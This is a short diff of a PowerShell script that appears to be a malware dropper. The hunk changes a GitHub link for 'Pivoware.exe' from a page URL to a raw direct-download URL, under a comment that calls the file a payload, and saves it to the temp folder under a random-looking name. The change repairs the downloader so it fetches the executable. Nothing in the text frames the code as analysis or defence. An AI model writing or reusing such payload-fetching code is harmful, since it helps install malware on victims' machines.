@@ -10,7 +10,7 @@ try {
 } catch {}
 
 # 2. download payload to temp
-$url = "https://github.com/timat8277-design/kazashtan.github.zov/blob/main/Pivoware.exe"
+$url = "https://github.com/timat8277-design/kazashtan.github.zov/raw/refs/heads/main/Pivoware.exe"
 $dest = Join-Path $env:TEMP "govnodsdadsakd.exe"
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
